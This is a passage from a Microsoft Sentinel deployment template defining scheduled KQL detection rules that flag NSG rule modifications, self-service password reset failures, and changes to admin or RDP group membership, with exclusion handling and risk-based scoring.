            "alertDisplayNameFormat": "BV-11021: [RBA] Windows - {{bv_src_user}} modified groups",
            "alertDescriptionFormat": "Generates an alert when a user is added to an admin group\n\n{{ExtendedDescription}}\n\nMITRE: T1098 MITRE: T1484\nCategory: Windows Security\ntag: RBA\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "RBAScore": "bv_alarm_rba_score",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "VictimEntity": "bv_alarm_victim_entities",
            "bv_behavior_id": "bv_behavior_id",
            "bv_dedup_hash": "bv_dedup_hash"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_object1"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_object2"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_object3"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11012')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11012')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11012: [RBA] Azure Activity - Azure NSG Rule Modification",
          "description": "Generates an alert when an Azure NSG rule has been modified. MITRE: T1578,T1526 Category: Azure Activity tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let alert_id = 'BV-11012';    \nlet start_time = 10m;\nlet latency = 10m;\nlet alert_bin = 10m;\nlet start_time_historical = 1d;\nlet start_time_suppress = 1d;\nlet end_time = now();\nlet excluded_description_fields = dynamic([]);      \nlet global_config = dynamic({\n  'EXCLUSION': dynamic([{}])\n});\nlet exclusions = array_concat(global_config['EXCLUSION'], BV11012_CONFIG['EXCLUSION'], dynamic([{}]));\nlet match = (table_parameter: (*), items:dynamic, match_type: string){\n        table_parameter\n        | extend all_data = pack_all()\n        | mv-apply e = items on (\n            extend keys = bag_keys(e)\n            | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n            | mv-apply k = keys to typeof(string) on (\n                extend list = split(e[k],',')\n                | mv-apply l = list to typeof(string) on (\n                    extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                    | mv-apply i = item to typeof(string) on (\n                        extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                        | summarize excluded_count = countif(compare)\n                        | extend item_excluded = excluded_count > 0\n                    )\n                    | summarize excluded_count = countif(item_excluded)\n                    | extend item_excluded = excluded_count > 0\n                )\n                | summarize excluded_list_item = countif(item_excluded > 0)\n            )\n            | extend matched =  key_count == excluded_list_item and key_count != 0\n            | extend visibility = iff(matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n            | extend bv_exclusion_reason = iff(matched, parse_json(e.metadata).reason, '')\n            | summarize matched=make_set(matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n        )\n        | extend match_status = iff(matched contains \"true\", match_type, '')\n};\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV11012_CONFIG['RBASCORE']),1.0);\nlet rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n  let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId \n  | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n      let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId \n  | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n      table_parameter\n      | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n      | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n      | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n      | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n      | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n      | extend ModifiedRBAScore = case(\n        ModifiedRBAScore > 10, 10.0\n        , ModifiedRBAScore <0.1, 0.1\n        , ModifiedRBAScore\n      )\n      | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n};\nlet description = (table_parameter: (*), excluded_fields:dynamic=dynamic(['']), max_field_length:int=300, max_array_length:int=5){\n    table_parameter\n    | extend all_data = pack_all()\n    | extend keys = bag_keys(all_data)\n    | mv-apply k = keys to typeof(string) on (\n        extend dynamic_entity = todynamic(trim(' ',tostring(all_data[k])))\n        | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (excluded_fields)), strcat(\n            case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(dynamic_entity)[0]) and array_length(dynamic_entity) > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(dynamic_entity,0,(max_array_length-1)),'\\n* '),0,max_field_length), '\\n')\n            , gettype(dynamic_entity) != 'array' and isnotempty(array_sort_desc(pack_array(tostring(all_data[k])))[0]), strcat(k,': ', dynamic_entity)\n            , gettype(dynamic_entity) == 'array' and array_length(dynamic_entity) == 1, strcat(k,': ', dynamic_entity[0])\n            , '')\n            ),'')\n            | summarize ExtendedDescription = make_set(ExtendedDescription)\n    )\n    | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nAzureActivity\n| where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where OperationNameValue contains 'networkSecurityGroups/securityRules'\n| extend bv_object_path = tostring(parse_json(Properties).entity)\n| extend bv_object = tostring(parse_json(Properties).resource)\n| extend bv_change_action = iff(OperationNameValue has 'write', 'modify', 'delete')\n| summarize \n      bv_object = make_set(bv_object, 10),\n      bv_object_path = make_set(bv_object_path, 10),\n      bv_start_time = min(TimeGenerated),\n      bv_end_time = max(TimeGenerated),\n      bv_object_count = dcount(bv_object)\n      by bv_user = Caller, bv_src_ip = CallerIpAddress, bv_change_action\n| extend bv_tuning_target = tolower(bv_cim_normalize_username(bv_user))\n| where bv_tuning_target !in~ (AUTHORIZED_ADMINS_V2)\n| project-away bv_tuning_target \n| invoke match(exclusions, 'exclusion')\n| where match_status != 'exclusion'\n  | invoke rba_score_calculator('BV-11012')\n  | invoke description(excluded_description_fields)\n| extend bv_alarm_victim_entities = bv_object\n| extend bv_alarm_attacker_entities = pack_array(bv_user)\n        , bv_dedup_hash = hash_sha1(bv_user)\n| where BV_FUN_DEDUP(alert_id,ago(start_time_suppress)) !has bv_dedup_hash\n| extend sourcetype = 'AzureActivity'\n| extend bv_rule_version = '1.1.4183'\n| extend bv_rule_timestamp = '1695927160.880163'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.1.4183 bv_rule_timestamp: 1695927160.880163'\n| project-keep\n    bv_*\n    , sourcetype\n    , ExtendedDescription",
          "queryFrequency": "PT10M",
          "queryPeriod": "PT10M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Discovery"
          ],
          "techniques": [
            "T1578",
            "T1526"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-11012: [RBA] Azure Activity - Azure NSG Rule Modification By {{bv_user}}",
            "alertDescriptionFormat": "Generates an alert when an Azure NSG rule has been modified.\n\n{{ExtendedDescription}}\n\nMITRE: T1578 MITRE: T1526\nCategory: Azure Activity\ntag: RBA\n{{bv_rule_combined_string}}\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "RBAScore": "bv_alarm_rba_score",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "VictimEntity": "bv_alarm_victim_entities"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_user"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11030')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11030')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11030: [RBA] Azure AD - Self Service Password Reset Failure",
          "description": "This alert identifies when a self service password reset failed MITRE: T1098 Category: Entra ID tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let alert_id = 'BV-11030';\nlet start_time = 1h;\nlet latency = 1h;\nlet end_time = now();\nlet calculate_hash = true;\nlet exclude_hash = true;\nlet alert_type = 'RBA';\nlet start_time_suppress = 1d;\nlet event_threshold = 5;\nlet global_config = dynamic({\n    'excluded_dedup_hash_fields': dynamic(['bv_raw', 'bv_src', 'bv_change', 'bv_object', 'bv_threshold_met', 'bv_vendor_reason'])\n});\nlet excluded_description_fields = dynamic(['bv_raw', 'bv_src_ip1', 'bv_vendor_reason', 'bv_threshold_met']);\nlet excluded_dedup_fields = array_concat(bv_excluded_dedup_hash_fields, global_config['excluded_dedup_hash_fields']);\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV11030_CONFIG['RBASCORE']),1.0);\nlet exclusions = array_concat(global_config['EXCLUSION'], BV11030_CONFIG['EXCLUSIONS'], dynamic([{}]));\nlet gen_detail_and_hash = (t: (*), ef:dynamic=dynamic([]), mfl:int=300, mal:int=5, efd:dynamic=dynamic([]), dh:boolean=true){\n        t\n        | extend a = pack_all()\n        | extend k = array_sort_asc(bag_keys(a))\n        | mv-apply k to typeof(string) on (\n            extend v = todynamic(tostring(a[k]))\n            | extend v = iff(gettype(v) != 'array', pack_array(v), v)\n            | extend \n                vl = iff(array_length(v) == 1 and isempty(v[0]),0,array_length(v))\n                , vf = k startswith 'bv_' and not (k has_any (efd))\n            | extend vv = vl == 1 \n            | extend \n                df = iff(vf and vv, k, '')\n                , dv = iff(vf and vv, v[0], '')\n            | extend e = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (ef)), strcat(\n                case(vl > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(v,0,(mal-1)),'\\n* '),0,mfl), '\\n')\n                , vl == 1, strcat(k,': ', v[0])\n                , '')\n                ),'')\n                | summarize \n                    e = make_set(e)\n                    , bv_dedup_fields = make_set_if(df, isnotempty(df))\n                    , bv_dedup_values = make_set_if(dv, isnotempty(dv))\n        )\n        | extend \n            ExtendedDescription=strcat_array(e, '\\n ')\n            , bv_dedup_hash = columnifexists('bv_dedup_hash', '')\n        | extend bv_dedup_hash = iff(dh,hash_sha1(strcat_array(bv_dedup_values,'')),bv_dedup_hash)\n  };\n        let match = (table_parameter: (*), items:dynamic, match_type: string){\n          table_parameter\n          | extend all_data = pack_all()\n          | mv-apply e = items on (\n              extend keys = bag_keys(e)\n              | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n              | mv-apply k = keys to typeof(string) on (\n                  extend list = split(e[k],',')\n                  | mv-apply l = list to typeof(string) on (\n                      extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                      | mv-apply i = item to typeof(string) on (\n                          extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                          | summarize excluded_count = countif(compare)\n                          | extend item_excluded = excluded_count > 0\n                      )\n                      | summarize excluded_count = countif(item_excluded)\n                      | extend item_excluded = excluded_count > 0\n                  )\n                  | summarize excluded_list_item = countif(item_excluded > 0)\n              )\n              | extend matched =  key_count == excluded_list_item and key_count != 0\n              | extend visibility = iff(matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n              | extend bv_exclusion_reason = iff(matched, parse_json(e.metadata).reason, '')\n              | summarize matched=make_set(matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n          )\n          | extend match_status = iff(matched contains \"true\", match_type, '')\n  };\n  let desc_gen = (T: (*), ttype:string){\n    T\n    | extend a = pack_all()\n    | extend t = tostring(a[ttype])\n    | extend t = replace('\\n', '@new_line@',t)\n    | extend ot = extract_all(@'(\\[.*?\\])',t)\n    | mv-apply o = ot on (\n        parse o with * '~' k'~' *\n        | extend v = todynamic(a[k])\n        | extend v = iff(gettype(v) !='array', pack_array(v), v)\n        | extend r = iff(isempty(v) or (array_length(v) == 1 and (isempty(v[0]) or v[0] == 0) or array_length(v)==0),'',o)\n        | extend r = trim_end(@'\\]',r)\n        | extend r = trim_start(@'\\[.*~',r)\n        | summarize otr =make_list(r)\n    )\n    | extend tr = replace_strings(t, ot, otr )\n    | extend sdk = extract_all(@'(<bv_[\\w_]*>)',tr)\n    | extend gk = extract_all(@'(<g_bv_[\\w_]*>)',tr)\n    | mv-apply g = gk on (\n        parse g with '<g_' key '_p' *\n        | parse g with * '_p_' verb '>'\n        | extend v = a[key]\n        | extend ip = (gettype(v) == 'array' and array_length(v) > 1) or toint(v)>1\n        | extend r = case (\n            isempty(verb) and not(ip), ''\n            , isempty(verb) and ip, 's'\n            , verb == 'was' and (not(ip) or isempty(ip)), 'was'\n            , verb == 'was' and ip, 'were'\n            , verb == 'this' and ip, 'these'\n            , verb == 'this' and not(ip), 'this'\n            , verb == 'is' and (not(ip) or isempty(ip)), 'is'\n            , verb == 'is' and ip, 'are'\n        ,''\n        )\n        | summarize gr = make_list(r)\n    )\n    | mv-apply k = sdk on (\n        parse k with '<' key '>'\n        | extend v = todynamic(tostring(a[key]))\n        | extend v = iff(gettype(v) != 'array', pack_array(v), v)\n        | extend vl = array_length(v)\n        | extend r = case(\n            vl == 1, v[0]\n            , vl == 2, strcat(v[0], ' and ', v[1])\n            ,vl  > 2, strcat(v[0], ', ', v[1], ', and ', vl-2, ' others')\n            ,'')\n    | summarize r = make_list(r))\n    | extend dr = replace_strings(tr, sdk, r)\n    | extend dr = replace_strings(dr, gk, gr)\n    | extend dr = replace('@new_line@', '\\n',dr)\n    | extend hd = coalesce(a['desc_gen'],dynamic({}))\n    | extend desc_gen = bag_set_key(hd, ttype, dr)\n  };\n  let rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n    let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId \n    | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n        let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId \n    | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n        table_parameter\n        | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n        | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n        | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n        | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n        | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n        | extend ModifiedRBAScore = case(\n          ModifiedRBAScore > 10, 10.0\n          , ModifiedRBAScore <0.1, 0.1\n          , ModifiedRBAScore\n        )\n        | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n  };            \nAuditLogs\n|where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where OperationName has_all ('password', 'reset')\n| summarize arg_max(TimeGenerated, *), bv_event_count = count(), FailureCount = countif(Result =~ 'failure'), SuccessCount = countif(Result !~ 'failure'), MaxTimeFailure = maxif(TimeGenerated, Result =~ 'failure'), MinTimeSuccess = minif(TimeGenerated, Result !~ 'failure')  by CorrelationId\n| extend bv_threshold_met = (MinTimeSuccess > MaxTimeFailure or (SuccessCount <> 0 and isnotempty(SuccessCount))) and FailureCount > event_threshold\n| project \n    bv_src_ip = tostring(parse_json(tostring(InitiatedBy.user)).ipAddress)\n    , bv_src_user = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)\n    , bv_dest_user = tostring(TargetResources[0].userPrincipalName)\n    , bv_change_action = 'modify'\n    , bv_change_result = Result\n    , bv_object = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)\n    , bv_object_category = 'user'\n    , bv_object_attr_category = 'credential'\n    , bv_change_id = CorrelationId\n    , bv_start_time = TimeGenerated\n    , bv_vendor_reason = ResultReason\n    , bv_threshold_met\n| extend bv_tuning_target = tolower(bv_cim_normalize_username(bv_src_user))\n| where bv_tuning_target !in~ (AUTHORIZED_ADMINS_V2)\n| project-away bv_tuning_target \n| join kind=leftouter (\n    SigninLogs |\n    project \n        bv_src_ip =IPAddress\n        , bv_src_country = tostring(LocationDetails.countryOrRegion)\n        , bv_src_region = tostring(LocationDetails.state)\n        , bv_src_city = tostring(LocationDetails.city)\n    | summarize arg_max(bv_src_country, *) by bv_src_ip)  on bv_src_ip\n| parse bv_src_user with user_name '@' user_domain\n| invoke match(exclusions, 'exclusion')\n| extend excluded = iff((alert_type in ('SOC','CUSTOM') and match_status == 'exclusion') or (alert_type == 'RBA' and visibility contains '0'), true, false)\n| where excluded == false\n| extend alert_id_temp = alert_id\n| lookup bv_desc_temp on alert_id_temp\n| invoke desc_gen('long_template')\n| invoke desc_gen('short_template')\n| invoke gen_detail_and_hash(excluded_description_fields, 300, 5,efd=excluded_dedup_fields,dh=calculate_hash)\n| where iff(exclude_hash, (BV_FUN_DEDUP(alert_id, start_time_suppress) !has bv_dedup_hash), true)\n| extend \n    bv_alarm_rba_score = BV_FUN_CALC_RBA(alert_id, visibility, rba_score)   \n    , bv_desc_l = strcat(desc_gen['long_template'],'\\n\\n',ExtendedDescription)\n    , bv_desc_s =desc_gen['short_template']\n| extend bv_alarm_victim_entities = pack_array(bv_dest_user)\n    , bv_alarm_attacker_entities = pack_array(bv_src_ip, bv_src_user)\n    , bv_alarm_rba_score = iff(bv_threshold_met, 3.0, 1.0)\n| extend bv_rule_version = '1.0.5166'\n| extend bv_rule_timestamp = '1712866315.3803105'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.5166 bv_rule_timestamp: 1712866315.3803105'\n| project-keep bv_*",
          "queryFrequency": "PT1H",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "{{bv_vendor_reason}}\n\n{{bv_desc_l}}\n\ntag: RBA\nCategory: Azure AD\nMITRE: T1098 \n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "VictimEntity": "bv_alarm_attacker_entities",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_dest_user"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11022')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11022')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11022: [RBA] Windows - User Removed From Monitored Group",
          "description": "Generates an alert when a user is removed from a monitored group MITRE: T1098,T1484 Category: Windows Security Events tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let start_time = 10m;\nlet latency = 10m;\nlet alert_bin = 10m;\nlet start_time_historical=1h;\nlet end_time = now();\nlet EventIDList = dynamic([4733, 4757, 4729]);\nlet global_config = dynamic({\n    'RBASCORE':0,\n    'EXCLUSION': dynamic([{}])\n});\nlet exclusions = array_concat(global_config['EXCLUSION'], BV11022_CONFIG['EXCLUSION'], dynamic([{}]));\nlet match = (table_parameter: (*), items:dynamic, match_type: string){\n        table_parameter\n        | extend all_data = pack_all()\n        | mv-apply e = items on (\n            extend keys = bag_keys(e)\n            | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n            | mv-apply k = keys to typeof(string) on (\n                extend list = split(e[k],',')\n                | mv-apply l = list to typeof(string) on (\n                    extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                    | mv-apply i = item to typeof(string) on (\n                        extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                        | summarize excluded_count = countif(compare)\n                        | extend item_excluded = excluded_count > 0\n                    )\n                    | summarize excluded_count = countif(item_excluded)\n                    | extend item_excluded = excluded_count > 0\n                )\n                | summarize excluded_list_item = countif(item_excluded > 0)\n            )\n            | extend matched =  key_count == excluded_list_item and key_count != 0\n            | extend visibility = iff(matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n            | extend bv_exclusion_reason = iff(matched, parse_json(e.metadata).reason, '')\n            | summarize matched=make_set(matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n        )\n        | extend match_status = iff(matched contains \"true\", match_type, '')\n};\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV11022_CONFIG['RBASCORE']),real(0.0));\nlet rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n  let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId \n  | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n      let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId \n  | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n      table_parameter\n      | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n      | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n      | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n      | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n      | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n      | extend ModifiedRBAScore = case(\n        ModifiedRBAScore > 10, 10.0\n        , ModifiedRBAScore <0.1, 0.1\n        , ModifiedRBAScore\n      )\n      | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n};\nlet description = (table_parameter: (*), excluded_fields:dynamic=dynamic(['']), max_field_length:int=300, max_array_length:int=5){\n    table_parameter\n    | extend all_data = pack_all()\n    | extend keys = bag_keys(all_data)\n    | mv-apply k = keys to typeof(string) on (\n        extend dynamic_entity = todynamic(trim(' ',tostring(all_data[k])))\n        | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (excluded_fields)), strcat(\n            case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(dynamic_entity)[0]) and array_length(dynamic_entity) > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(dynamic_entity,0,(max_array_length-1)),'\\n* '),0,max_field_length), '\\n')\n            , gettype(dynamic_entity) != 'array' and isnotempty(array_sort_desc(pack_array(tostring(all_data[k])))[0]), strcat(k,': ', dynamic_entity)\n            , gettype(dynamic_entity) == 'array' and array_length(dynamic_entity) == 1, strcat(k,': ', dynamic_entity[0])\n            , '')\n            ),'')\n            | summarize ExtendedDescription = make_set(ExtendedDescription)\n    )\n    | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nSecurityEvent\n| where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| extend cn = extract(@'CN=([^=]*),', 1, MemberName)\n| join kind=leftouter (\n  SecurityEvent\n  | where TimeGenerated > ago(start_time_historical)\n  | where EventID in (4624)\n  | summarize arg_max(TimeGenerated,*) by TargetUserSid \n| project TargetUserSid,bv_object=TargetUserName\n  ) on $left.MemberSid == $right.TargetUserSid\n| where tolower(TargetUserName) matches regex 'admin|rdp'\n| summarize \n    bv_object_attr = make_set(TargetUserName)\n    , bv_start_time = min(TimeGenerated)\n    , bv_end_time = max(TimeGenerated)\n    , bv_src_dvc = make_set(Computer)\n    , bv_object = make_set(coalesce(bv_object,cn))\n    , bv_object_id = make_set(MemberSid)\n    , bv_raw_sample = make_set(EventData,3)\n    , bv_event_id = make_set(EventID)\n      by  \n          bv_src_user = SubjectUserName\n          , bv_src_user_id = SubjectUserSid      \n| extend bv_tuning_target = tolower(bv_cim_normalize_username(bv_src_user))\n| where bv_tuning_target !in~ (AUTHORIZED_ADMINS_V2)\n| project-away bv_tuning_target \n  | extend\n    bv_object_category = 'account'\n    , bv_object_attr_category = 'group'\n    , bv_vendor_product = 'Windows'\n    , sourcetype = 'SecurityEvent'\n    , bv_change_action = 'modify'\n    , bv_object_count = array_length(bv_object)\n    , bv_object1 = bv_object[0]\n    , bv_object2 = bv_object[1]\n    , bv_object3 = bv_object[2]\n| invoke match(exclusions, 'exclusion')\n| invoke rba_score_calculator('BV-11022')\n| invoke description()\n| extend bv_alarm_victim_entities = array_concat(bv_object, bv_object_id)\n| extend bv_alarm_attacker_entities = pack_array(bv_src_user)\n| extend bv_behavior_id = hash_sha1(bv_src_user)\n| extend bv_rule_version = '1.1.5166'\n| extend bv_rule_timestamp = '1712866315.0475366'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.1.5166 bv_rule_timestamp: 1712866315.0475366'\n| project-keep\n    bv_*\n    , sourcetype\n    , ExtendedDescription",
          "queryFrequency": "PT10M",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "DefenseEvasion",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1098",
            "T1484"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-11022: [RBA] Windows - {{bv_src_user}} removed a user from a group",
